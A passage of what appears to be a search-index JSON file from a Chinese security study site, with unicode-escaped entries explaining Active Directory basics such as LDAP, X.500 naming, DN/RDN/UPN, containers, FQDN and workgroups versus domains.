</ol>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#ldap","title":"LDAP","text":"<p>\u65e2\u7136\u6709\u4e86\u76ee\u5f55\u670d\u52a1\u6570\u636e\u5e93\u4e86\uff0c\u5c31\u5fc5\u7136\u9700\u8981\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\u53bb\u8bbf\u95ee\u76ee\u5f55\u670d\u52a1\u6570\u636e\u5e93\u4e86\u3002\u800c LDAP \u534f\u8bae\u5c31\u662f\u8bbe\u8ba1\u7528\u6765\u5bf9\u76ee\u5f55\u670d\u52a1\u6570\u636e\u5e93\u8bbf\u95ee\u7684\u534f\u8bae\u4e4b\u4e00\u3002</p> <p>LDAP(Lightweight Directory Access Protocol)\u8f7b\u91cf\u7ea7\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff0c\u5b83\u57fa\u4e8eX.500 \u6807\u51c6\uff0c\u662f\u4e00\u4e2a\u5f00\u653e\u7684\u3001\u4e2d\u7acb\u7684\u3001\u5de5\u4e1a\u6807\u51c6\u7684\u5e94\u7528\u534f\u8bae\u3002\u5b83\u53ef\u4ee5\u7528\u6765\u67e5\u8be2\u4e0e\u66f4\u65b0\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\uff0c\u6d3b\u52a8\u76ee\u5f55\u5229\u7528 LDAP \u540d\u79f0\u8def\u5f84\u6765\u63cf\u8ff0\u5bf9\u8c61\u5728\u6d3b\u52a8\u76ee\u5f55\u5185\u7684\u4f4d\u7f6e\u3002</p> <p>LDAP \u76ee\u5f55\u7c7b\u4f3c\u4e8e\u6587\u4ef6\u7cfb\u7edf\u76ee\u5f55\uff0c\u4f8b\u5982\uff1a<code>CN=DC01,OU=Domain Controllers,DC=xie,DC=com</code>\uff0c\u5982\u679c\u7c7b\u6bd4\u6210\u6587\u4ef6\u7cfb\u7edf\u7684\u8bdd\uff0c\u53ef\u88ab\u770b\u4f5c\u5982\u4e0b\u6587\u4ef6\u8def\u5f84\uff1a<code>xie.com/Domain Controllers/DC01</code>\uff0c<code>DC01</code>\u4ee3\u8868\u4e00\u4e2a\u5bf9\u8c61\uff0c<code>OU=Domain Controllers</code> \u4ee3\u8868\u4e00\u4e2a <code>Domain Controllers</code> \u7ec4\u7ec7\u5355\u4f4d\u3002\u8fd9\u53e5\u8bdd\u7684\u542b\u4e49\u5c31\u662f DC01 \u8fd9\u4e2a\u5bf9\u8c61\u5904\u5728 xie.com \u57df\u7684 Domain Controllers \u7ec4\u7ec7\u5355\u5143\u4e2d\u3002\u5728 LDAP \u4e2d\u6570\u636e\u4ee5\u6811\u72b6\u65b9\u5f0f\u7ec4\u7ec7\uff0c\u5728\u6811\u72b6\u4fe1\u606f\u4e2d\u7684\u57fa\u672c\u6570\u636e\u5355\u5143\u662f\u6761\u76ee\uff0c\u800c\u6bcf\u4e2a\u6761\u76ee\u7531\u5c5e\u6027\u7ec4\u6210\u3002</p> <p>\u4f8b\u5982\u56fe\u6240\u793a\uff0cDC01\u3001win7\u3001test \u7b49\u90fd\u662f\u4e00\u4e2a\u6761\u76ee\uff0c\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u90fd\u6709\u81ea\u8eab\u7684\u5c5e\u6027\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#x500","title":"X.500 \u6807\u51c6\u5b9a\u4e49","text":"<p>\u90a3\u4e48 LDAP \u534f\u8bae\u5982\u4f55\u80fd\u5feb\u901f\u7684\u5b9a\u4f4d\u9700\u8981\u67e5\u8be2\u7684\u5bf9\u8c61\u5462\uff1f</p> <p>\u5b8c\u6210\u8fd9\u9879\u5de5\u4f5c\u9700\u8981\u5b9a\u4e49\u540d\u79f0\u7a7a\u95f4\uff0c\u4f7f\u5176\u53ef\u4ee5\u5feb\u901f\u7684\u786e\u5b9a\u6bcf\u4e2a\u5bf9\u8c61\u7684\u4f4d\u7f6e\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u770b\u770b X.500 \u6807\u51c6\u4e2d\u5b9a\u4e49\u4e86\u54ea\u4e9b\u4e1c\u897f\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#1dc","title":"1.DC","text":"<p>DC(Domain Component) \u57df\u7ec4\u4ef6\uff1a\u6b64 DC \u4e0d\u662f Domain Controllers \u57df\u63a7\uff0c\u800c\u662f\u7c7b\u4f3c\u4e8e DNS \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0cDC \u5bf9\u8c61\u8868\u793a\u4f7f\u7528 DNS \u6765\u5b9a\u4e49\u5176\u540d\u79f0\u7a7a\u95f4\u7684 LDAP \u6811\u7684\u9876\u90e8\u3002\u4f8b\u5982\u57df xie.com\uff0c\u7528 . \u5206\u5f00\u7684\u6bcf\u4e2a\u5355\u5143\u90fd\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2a DC \u57df\u7ec4\u4ef6\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#2ou","title":"2.OU","text":"<p>OU(OrganizationUnit) \u7ec4\u7ec7\u5355\u4f4d\uff1a\u5728\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u4e2d\u5b9a\u4e49\u4e86 Organization Unit\u7ec4\u7ec7\u5355\u4f4d\u7c7b\uff0c\u6700\u591a\u53ef\u4ee5\u6709\u56db\u7ea7\uff0c\u6bcf\u7ea7\u6700\u957f 32 \u4e2a\u5b57\u7b26\uff0c\u53ef\u4ee5\u4e3a\u4e2d\u6587\u3002\u5982OU=Domain Controllers \u5c31\u662f\u4e00\u4e2a\u7ec4\u7ec7\u5355\u4f4d\uff0c\u7ec4\u7ec7\u5355\u4f4d\u4e2d\u5305\u542b\u5bf9\u8c61\u3001\u5bb9\u5668\uff0c\u8fd8\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7ec4\u7ec7\u5355\u4f4d\uff0c\u5e76\u4e14\u7ec4\u7ec7\u5355\u4f4d\u8fd8\u53ef\u4ee5\u94fe\u63a5\u7ec4\u7b56\u7565\u3002\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230Domain Controllers \u7684 objectClass \u5c5e\u6027\u662f OrganizationUnit\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#3cn","title":"3.CN","text":"<p>CN(Common Name) \u901a\u7528\u540d\u79f0\uff1a\u5bf9\u8c61\u7684\u540d\u79f0\uff0c\u6700\u5927\u957f\u5ea6\u53ef\u4ee5\u5230 80 \u4e2a\u5b57\u7b26\uff0c\u53ef\u4ee5\u4e3a\u4e2d\u6587\u3002\u4f8b\u5982\u4e00\u4e2a\u7528\u6237\u540d\u4e3a\u5f20\u4e09\uff0c\u90a3\u4e48\u5f20\u4e09\u5c31\u662f\u4e00\u4e2a CN\uff0c\u518d\u6bd4\u5982\u4e00\u4e2a\u8ba1\u7b97\u673a\u540d\u4e3aWin7\uff0c\u90a3\u4e48 Win7 \u5c31\u662f CN\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#4dn","title":"4.DN(\u5305\u542b\u4e0a\u9762\u4e09\u4e2a\u5143\u7d20)","text":"<p>DN(Distinguished Name)\u53ef\u5206\u8fa8\u540d\u79f0\uff1aActive Directory \u4e2d\u7684\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u5b8c\u5168\u552f\u4e00\u7684 DN\uff0c\u5176\u5305\u542b\u5bf9\u8c61\u5230 LDAP \u540d\u79f0\u7a7a\u95f4\u6839\u7684\u6574\u4e2a\u8def\u5f84\u3002DN \u6709\u4e09\u4e2a\u5c5e\u6027\uff0c\u5206\u522b\u662f DC\u3001OU\u3001CN\u3002DN \u53ef\u4ee5\u8868\u793a\u4e3a ldap \u7684\u67d0\u4e2a\u76ee\u5f55\uff0c\u4e5f\u53ef\u4ee5\u8868\u793a\u6210\u76ee\u5f55\u4e2d\u7684\u67d0\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u662f\u7528\u6237\u3001\u8ba1\u7b97\u673a\u7b49\u3002</p> <p>\u5982\uff1aCN=AD,OU=Domain Controllers,DC=xie,DC=com \u8fd9\u662f\u4e00\u4e2a DN\uff0c\u5b83\u662f\u5c42\u6b21\u7ed3\u6784\u6811\uff0c\u4ece\u53f3(\u6839)\u5411\u5de6(\u53f6)\u3002\u8868\u793a\u7684\u662f xie.com \u57df\u4e0b\u7684 Domain Controllers \u7ec4\u7ec7\u5355\u5143\u4e0b \u7684 AD \u5bf9\u8c61\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u518d\u5982\uff1aCN=Administrator,CN=Users,DC=xie,DC=com \u8fd9\u662f\u4e00\u4e2a DN\uff0c\u8868\u793a\u7684\u662fxie.com \u57df\u4e0b\u7684 Users \u5bb9\u5668\u4e0b\u7684 Administrator \u5bf9\u8c61\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#5rdn","title":"5.RDN","text":"<p>RDN(Relative Distinguished Name) \u76f8\u5bf9\u53ef\u5206\u8fa8\u540d\u79f0\uff1a\u4ed6\u4e0e\u76ee\u5f55\u7ed3\u6784\u65e0\u5173\u3002\u6bd4\u5982CN=Administrator,CN=Users,DC=xie,DC=com\uff0c\u4ed6\u7684 RDN \u4e3aCN=Administrator\u3002\u4e24\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u5177\u6709\u76f8\u540c\u7684 RDN\uff0c\u4f46\u662f\u4e0d\u80fd\u5177\u6709\u76f8\u540c\u7684 DN\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#6upn","title":"6.UPN","text":"<p>UPN(User Principal Name)\u7528\u6237\u8fa8\u522b\u540d\u79f0\uff1a\u5982\u5728\u57df xie.com \u4e2d\u7684 administrator\u7528\u6237\uff0c\u5b83\u7684 UPN \u4e3a\uff1aadministrator@xie.com \u3002\u7528\u6237\u767b\u5f55\u65f6\u6700\u597d\u8f93\u5165 UPN\uff0c\u56e0\u4e3a\u65e0\u8bba\u6b64\u7528\u6237\u7684\u8d26\u53f7\u88ab\u79fb\u52a8\u5230\u54ea\u4e00\u4e2a\u57df\uff0c\u5176 UPN \u90fd\u4e0d\u4f1a\u53d8\u5316\uff0c\u56e0\u6b64\u7528\u6237\u53ef\u4ee5\u4e00\u76f4\u7528\u540c\u4e00\u4e2a UPN \u6765\u767b\u5f55\u3002\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 administrator \u7684 UPN\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#7-container","title":"7.\u5bb9\u5668 Container","text":"<p>\u5728\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u4e2d\u5b9a\u4e49\u4e86\u5bb9\u5668 Container \u7c7b\uff0c\u5bb9\u5668\u662f\u4e00\u4e9b\u5c5e\u6027\u7684\u96c6\u5408\u3002\u5bb9\u5668\u5185\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u5bf9\u8c61\uff0c\u5982\u7528\u6237\u3001\u8ba1\u7b97\u673a\u7b49\uff0c\u4f46\u662f\u5bb9\u5668\u4e2d\u4e0d\u80fd\u518d\u5d4c\u5957\u5176\u4ed6\u5bb9\u5668\u548c OU \u7ec4\u7ec7\u5355\u4f4d\u3002\u8ba1\u7b97\u673a\u9ed8\u8ba4\u5728 CN=Computers \u5bb9\u5668\u4e2d\uff0c\u7528\u6237\u9ed8\u8ba4\u5728 CN=Users \u5bb9\u5668\u4e2d\u3002\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 CN=Computers \u7684 objectClass \u5c5e\u6027\u4e3a container\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#fqdn","title":"FQDN","text":"<p>FQDN(Fully Qualified Domain Name)\u5168\u9650\u5b9a\u57df\u540d\uff1a\u540c\u65f6\u5e26\u6709\u4e3b\u673a\u540d\u548c\u57df\u540d\u7684\u540d\u79f0\u3002\u5982\u57df xie.com \u4e0b\u7684 win7 \u4e3b\u673a\uff0c\u5176 FQDN \u4e3a win7.xie.com\u3002\u5168\u9650\u5b9a\u57df\u540d\u53ef\u4ee5\u4ece\u903b\u8f91\u4e0a\u51c6\u786e\u5730\u8868\u793a\u51fa\u4e3b\u673a\u5728\u4ec0\u4e48\u5730\u65b9\uff0c\u4e5f\u53ef\u4ee5\u8bf4\u5168\u9650\u5b9a\u57df\u540d\u662f\u4e3b\u673a\u540d\u7684\u4e00\u79cd\u5b8c\u5168\u8868\u793a\u5f62\u5f0f\u3002\u4ece\u5168\u9650\u5b9a\u57df\u540d\u4e2d\u5305\u542b\u7684\u4fe1\u606f\u53ef\u4ee5\u770b\u51fa\u4e3b\u673a\u5728\u57df\u540d\u6811\u4e2d\u7684\u4f4d\u7f6e\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html","title":"\u5de5\u4f5c\u7ec4\u548c\u57df","text":"<p>\u57df(Domain)\u662f\u5fae\u8f6f\u4e3a\u96c6\u4e2d\u7ba1\u7406\u8ba1\u7b97\u673a\u800c\u63a8\u51fa\u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u5176\u4e2d\u6240\u6709\u7684\u7528\u6237\u5e10\u6237\uff0c\u8ba1\u7b97\u673a\uff0c\u6253\u5370\u673a\u548c\u5176\u4ed6\u5b89\u5168\u4e3b\u4f53\u90fd\u5728\u57df\u63a7\u5236\u5668\u7684\u4e2d\u592e\u6570\u636e\u5e93\u4e2d\u6ce8\u518c\u3002 \u5728\u57df\u4e2d\u4f7f\u7528\u8ba1\u7b97\u673a\u7684\u6bcf\u4e2a\u4eba\u90fd\u4f1a\u6536\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u7528\u6237\u5e10\u6237\uff0c\u7136\u540e\u53ef\u4ee5\u4e3a\u8be5\u5e10\u6237\u5206\u914d\u5bf9\u8be5\u57df\u5185\u8d44\u6e90\u7684\u8bbf\u95ee\u6743\u9650\u3002\u4ece Windows Server 2003 \u5f00\u59cb\uff0cActive Directory \u662f\u8d1f\u8d23\u7ef4\u62a4\u8be5\u4e2d\u592e\u6570\u636e\u5e93\u7684 Windows \u7ec4\u4ef6\u3002Windows \u57df\u7684\u6982\u5ff5\u4e0e\u5de5\u4f5c\u7ec4\u7684\u6982\u5ff5\u5f62\u6210\u5bf9\u6bd4\uff0c\u5728\u5de5\u4f5c\u7ec4\u4e2d\uff0c\u6bcf\u53f0\u8ba1\u7b97\u673a\u90fd\u7ef4\u62a4\u81ea\u5df1\u7684\u5b89\u5168\u4e3b\u4f53\u6570\u636e\u5e93\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#_2","title":"\u5de5\u4f5c\u7ec4","text":"<p>\u5de5\u4f5c\u7ec4\uff08Work Group\uff09\u662f\u5c40\u57df\u7f51\u4e2d\u7684\u4e00\u4e2a\u6982\u5ff5\uff0c\u5b83\u662f\u6700\u5e38\u89c1\u6700\u7b80\u5355\u6700\u666e\u901a\u7684\u8d44\u6e90\u7ba1\u7406\u6a21\u5f0f\uff0c\u5c31\u662f\u5c06\u4e0d\u540c\u7684\u7535\u8111\u6309\u529f\u80fd\u5206\u522b\u5217\u5165\u4e0d\u540c\u7684\u7ec4\u4e2d\uff0c\u4ee5\u65b9\u4fbf\u7ba1\u7406\u3002\u5728\u4e00\u4e2a\u7f51\u7edc\u5185\uff0c\u53ef\u80fd\u6709\u4e0a\u767e\u53f0\u7535\u8111\uff0c\u5982\u679c\u8fd9\u4e9b\u7535\u8111\u4e0d\u8fdb\u884c\u5206\u7ec4\uff0c\u90fd\u5217\u5728\u201c\u7f51\u4e0a\u90bb\u5c45\u201d\u4e2d\uff0c\u7535\u8111\u65e0\u89c4\u5219\u7684\u6392\u5217\u4e3a\u6211\u4eec\u8bbf\u95ee\u8d44\u6e90\u5e26\u6765\u4e0d\u65b9\u4fbf\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\uff0cWindows98 \u64cd\u4f5c\u7cfb\u7edf\u4e4b\u540e\u5c31\u5f15\u7528\u4e86\u201c\u5de5\u4f5c\u7ec4\u201d\u8fd9\u4e2a\u6982\u5ff5\uff0c\u5c06\u4e0d\u540c\u7684\u7535\u8111\u6309\u529f\u80fd\u5206\u522b\u5217\u5165\u4e0d\u540c\u7684\u7ec4\u4e2d\uff0c\u5982\u8f6f\u4ef6\u90e8\u7684\u7535\u8111\u90fd\u5217\u5165\u201c\u8f6f\u4ef6\u90e8\u201d\u5de5\u4f5c\u7ec4\u4e2d\uff0c\u7f51\u7edc\u90e8\u7684\u7535\u8111\u90fd\u5217\u5165\u201c\u7f51\u7edc\u90e8\u201d\u5de5\u4f5c\u7ec4\u4e2d\u3002\u4f60\u8981\u8bbf\u95ee\u67d0\u4e2a\u90e8\u95e8\u7684\u8d44\u6e90\uff0c\u5c31\u5728\u201c\u7f51\u4e0a\u90bb\u5c45\u201d\u91cc\u627e\u5230\u90a3\u4e2a\u90e8\u95e8\u7684\u5de5\u4f5c\u7ec4\u540d\uff0c\u53cc\u51fb\u5c31\u53ef\u4ee5\u770b\u5230\u90a3\u4e2a\u90e8\u95e8\u7684\u7535\u8111\u4e86\u3002\u8ba1\u7b97\u673a\u901a\u8fc7\u5de5\u4f5c\u7ec4\u8fdb\u884c\u5206\u7c7b\uff0c\u4f7f\u5f97\u6211\u4eec\u8bbf\u95ee\u8d44\u6e90\u66f4\u52a0\u5177\u6709\u5c42\u6b21\u5316\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6240\u6709\u8ba1\u7b97\u673a\u90fd\u5904\u5728\u540d\u4e3a WORKGROUP \u7684\u5de5\u4f5c\u7ec4\u4e2d\uff0c\u5de5\u4f5c\u7ec4\u8d44\u6e90\u7ba1\u7406\u6a21\u5f0f\u9002\u5408\u4e8e\u7f51\u7edc\u4e2d\u8ba1\u7b97\u673a\u4e0d\u591a\uff0c\u5bf9\u7ba1\u7406\u8981\u6c42\u4e0d\u4e25\u683c\u7684\u60c5\u51b5\u3002\u5b83\u7684\u5efa\u7acb\u6b65\u9aa4\u7b80\u5355\uff0c\u4f7f\u7528\u8d77\u6765\u4e5f\u5f88\u597d\u4e0a\u624b\u3002\u5927\u90e8\u5206\u4e2d\u5c0f\u516c\u53f8\u90fd\u91c7\u53d6\u5de5\u4f5c\u7ec4\u7684\u65b9\u5f0f\u5bf9\u8d44\u6e90\u8fdb\u884c\u6743\u9650\u5206\u914d\u548c\u76ee\u5f55\u5171\u4eab\u3002</p> <p>\u76f8\u540c\u7ec4\u4e2d\u7684\u4e0d\u540c\u7528\u6237\u901a\u8fc7\u5bf9\u65b9\u4e3b\u673a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u53ef\u4ee5\u67e5\u770b\u5bf9\u65b9\u5171\u4eab\u7684\u6587\u4ef6\u5939\u3002\u4e0d\u540c\u7ec4\u7684\u4e0d\u540c\u7528\u6237\u901a\u8fc7\u5bf9\u65b9\u4e3b\u673a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u4e5f\u53ef\u4ee5\u67e5\u770b\u5bf9\u65b9\u5171\u4eab\u7684\u6587\u4ef6\u5939\u3002\u6240\u4ee5\u5de5\u4f5c\u7ec4\u5e76\u4e0d\u5b58\u5728\u771f\u6b63\u7684\u96c6\u4e2d\u7ba1\u7406\u4f5c\u7528 , \u5de5\u4f5c\u7ec4\u91cc\u7684\u6240\u6709\u8ba1\u7b97\u673a\u90fd\u662f\u5bf9\u7b49\u7684 , \u4e5f\u5c31\u662f\u6ca1\u6709\u670d\u52a1\u5668\u548c\u5ba2\u6237\u673a\u4e4b\u5206\u7684\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u5de5\u4f5c\u7ec4\u7684\u62d3\u6251\u56fe\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#1","title":"1.\u5de5\u4f5c\u7ec4\u7684\u7279\u70b9","text":"<p>\u5de5\u4f5c\u7ec4\u662f\u4e00\u4e2a\u7531\u8bb8\u591a\u5728\u540c\u4e00\u7269\u7406\u5730\u70b9\uff0c\u800c\u4e14\u88ab\u76f8\u540c\u7684\u5c40\u57df\u7f51\u8fde\u63a5\u8d77\u6765\u7684\u8ba1\u7b97\u673a\u7ec4\u6210\u7684\u5c0f\u7ec4\u3002\u76f8\u5e94\u5730\uff0c\u4e00\u4e2a\u5de5\u4f5c\u7ec4\u4e5f\u53ef\u4ee5\u662f\u904d\u5e03\u4e00\u4e2a\u673a\u6784\u7684\uff0c\u4f46\u5374\u88ab\u540c\u4e00\u7f51\u7edc\u8fde\u63a5\u7684\u8ba1\u7b97\u673a\u6784\u6210\u7684\u903b\u8f91\u5c0f\u7ec4\u3002\u5728\u4ee5\u4e0a\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u5728\u5de5\u4f5c\u7ec4\u4e2d\u7684\u8ba1\u7b97\u673a\u90fd\u53ef\u4ee5\u4ee5\u9884\u5b9a\u4e49\u7684\u65b9\u5f0f\uff0c\u5171\u4eab\u6587\u6863\u3001\u5e94\u7528\u7a0b\u5e8f\u3001\u7535\u5b50\u51fd\u4ef6\u548c\u7cfb\u7edf\u8d44\u6e90\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#2","title":"2.\u5de5\u4f5c\u7ec4\u7684\u4f18\u7f3a\u70b9","text":""},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#1_1","title":"(1) \u4f18\u70b9","text":"<p>\u5de5\u4f5c\u7ec4\u4e0b\u8d44\u6e90\u53ef\u4ee5\u76f8\u5f53\u968f\u673a\u548c\u7075\u6d3b\u7684\u5206\u5e03\uff0c\u66f4\u65b9\u4fbf\u8d44\u6e90\u5171\u4eab\uff0c\u7ba1\u7406\u5458\u53ea\u9700\u8981\u5b9e\u65bd\u76f8\u5f53\u4f4e\u7ea7\u7684\u7ef4\u62a4\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#2_1","title":"(2) \u7f3a\u70b9","text":"<p>\u7f3a\u4e4f\u96c6\u4e2d\u7ba1\u7406\u4e0e\u63a7\u5236\u7684\u673a\u5236\uff0c\u6ca1\u6709\u96c6\u4e2d\u7684\u7edf\u4e00\u5e10\u6237\u7ba1\u7406\uff0c\u6ca1\u6709\u5bf9\u8d44\u6e90\u5b9e\u65bd\u66f4\u52a0\u9ad8\u6548\u7387\u7684\u96c6\u4e2d\u7ba1\u7406\uff0c\u6ca1\u6709\u5b9e\u65bd\u5de5\u4f5c\u7ad9\u7684\u6709\u6548\u914d\u7f6e\u548c\u5b89\u5168\u6027\u4e25\u5bc6\u63a7\u5236\uff0c\u7f3a\u4e4f\u5355\u70b9\u767b\u5f55\uff0c\u53ef\u6269\u5c55\u6027\uff0c\u5f39\u6027/\u707e\u96be\u6062\u590d\u529f\u80fd\u4ee5\u53ca\u8bb8\u591a\u5b89\u5168\u529f\u80fd\u3002\u53ea\u9002\u5408\u5c0f\u89c4\u6a21\u7528\u6237\u7684\u4f7f\u7528\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#_3","title":"\u57df","text":"<p>\u57fa\u4e8e\u5de5\u4f5c\u7ec4\u4ee5\u4e0a\u7f3a\u70b9\uff0c\u5f53\u8ba1\u7b97\u673a\u6570\u91cf\u6bd4\u8f83\u591a\u65f6\uff0c\u5927\u578b\u4f01\u4e1a\u4e2d\u7f51\u7edc\u89c4\u6a21\u5927\uff0c\u9700\u8981\u7edf\u4e00\u7684\u7ba1\u7406\u548c\u96c6\u4e2d\u7684\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u4e14\u80fd\u591f\u7ed9\u7528\u6237\u63d0\u4f9b\u65b9\u4fbf\u7684\u641c\u7d22\u548c\u4f7f\u7528\u7f51\u7edc\u8d44\u6e90\u7684\u65b9\u5f0f\uff0c\u5de5\u4f5c\u7ec4\u7684\u7ec4\u7ec7\u5f62\u5f0f\u5c31\u4e0d\u5408\u9002\u4e86\uff0c\u4e8e\u662f\u57df\u5c31\u51fa\u73b0\u4e86\uff01\u57df\u662f\u7531\u5de5\u4f5c\u7ec4\u5347\u7ea7\u800c\u6765\u7684\u9ad8\u7ea7\u67b6\u6784\uff0c\u53ef\u4ee5\u7b80\u5355\u7684\u628a\u57df\u7406\u89e3\u6210\u5347\u7ea7\u7248\u7684\u201c\u5de5\u4f5c\u7ec4\u201d\uff0c\u76f8\u6bd4\u5de5\u4f5c\u7ec4\u800c\u8a00\uff0c\u5b83\u6709\u4e00\u4e2a\u66f4\u52a0\u4e25\u683c\u7684\u5b89\u5168\u7ba1\u7406\u63a7\u5236\u673a\u5236\uff0c\u5982\u679c\u4f60\u60f3\u8bbf\u95ee\u57df\u5185\u7684\u8d44\u6e90\uff0c\u5c31\u5fc5\u987b\u62e5\u6709\u4e00\u4e2a\u5408\u6cd5\u7684\u8eab\u4efd\u767b\u9646\u5230\u8be5\u57df\u4e2d,\u800c\u4f60\u5bf9\u8be5\u57df\u5185\u7684\u8d44\u6e90\u62e5\u6709\u4ec0\u4e48\u6837\u7684\u6743\u9650,\u8fd8\u9700\u8981\u53d6\u51b3\u4e8e\u4f60\u5728\u8be5\u57df\u4e2d\u7684\u7528\u6237\u8eab\u4efd\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u57df\u7684\u62d3\u6251\u56fe\uff1a</p> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article2/index.html#1_2","title":"1.\u57df\u7684\u539f\u7406","text":"<p>\u5176\u5b9e\u53ef\u4ee5\u628a\u57df\u548c\u5de5\u4f5c\u7ec4\u8054\u7cfb\u8d77\u6765\u7406\u89e3\uff0c\u5728\u5de5\u4f5c\u7ec4\u4e0a\u4f60\u4e00\u5207\u7684\u8bbe\u7f6e\u5728\u672c\u673a\u4e0a\u8fdb\u884c\u5305\u62ec\u5404\u79cd\u7b56\u7565\uff0c\u7528\u6237\u767b\u5f55\u4e5f\u662f\u767b\u9646\u5728\u672c\u673a\u7684\uff0c\u5bc6\u7801\u662f\u653e\u5728\u672c\u673a\u7684\u6570\u636e\u5e93\u6765\u9a8c\u8bc1\u7684\u3002\u800c\u5982\u679c\u4f60\u7684\u8ba1\u7b97\u673a\u52a0\u5165\u57df\u7684\u8bdd\uff0c\u5404\u79cd\u7b56\u7565\u662f\u57df\u63a7\u5236\u5668\u7edf\u4e00\u8bbe\u5b9a\u7684\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801\u4e5f\u662f\u653e\u5230\u57df\u63a7\u5236\u5668\u53bb\u9a8c\u8bc1\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u7684\u8d26\u53f7\u5bc6\u7801\u53ef\u4ee5\u5728\u540c\u4e00\u57df\u7684\u4efb\u4f55\u4e00\u53f0\u8ba1\u7b97\u673a\u767b\u5f55\u3002</p> <p>\u5982\u679c\u8bf4\u5de5\u4f5c\u7ec4\u662f\"\u514d\u8d39\u7684\u65c5\u5e97\"\uff0c\u90a3\u4e48\u57df(Domain)\u5c31\u662f\"\u661f\u7ea7\u7684\u5bbe\u9986\"\uff1b\u5de5\u4f5c\u7ec4\u53ef\u4ee5\u968f\u4fbf\u8fdb\u8fdb\u51fa\u51fa\uff0c\u800c\u57df\u5219\u9700\u8981\u4e25\u683c\u63a7\u5236\u3002\"\u57df\"\u7684\u771f\u6b63\u542b\u4e49\u6307\u7684\u662f\u670d\u52a1\u5668\u63a7\u5236\u7f51\u7edc\u4e0a\u7684\u8ba1\u7b97\u673a\u80fd\u5426\u52a0\u5165\u7684\u8ba1\u7b97\u673a\u7ec4\u5408\u3002\u4e00\u63d0\u5230\u7ec4\u5408\uff0c\u52bf\u5fc5\u9700\u8981\u4e25\u683c\u7684\u63a7\u5236\u3002\u6240\u4ee5\u5b9e\u884c\u4e25\u683c\u7684\u7ba1\u7406\u5bf9\u7f51\u7edc\u5b89\u5168\u662f\u975e\u5e38\u5fc5\u8981\u7684\u3002\u5728\u5bf9\u7b49\u7f51\u6a21\u5f0f\u4e0b\uff0c\u4efb\u4f55\u4e00\u53f0\u7535\u8111\u53ea\u8981\u63a5\u5165\u7f51\u7edc\uff0c\u5176\u4ed6\u673a\u5668\u5c31\u90fd\u53ef\u4ee5\u8bbf\u95ee\u5171\u4eab\u8d44\u6e90\uff0c\u5982\u5171\u4eab\u4e0a\u7f51\u7b49\u3002\u5c3d\u7ba1\u5bf9\u7b49\u7f51\u7edc\u4e0a\u7684\u5171\u4eab\u6587\u4ef6\u53ef\u4ee5\u52a0\u8bbf\u95ee\u5bc6\u7801\uff0c\u4f46\u662f\u975e\u5e38\u5bb9\u6613\u88ab\u7834\u89e3\u3002\u5728\u7531 Windows 9x 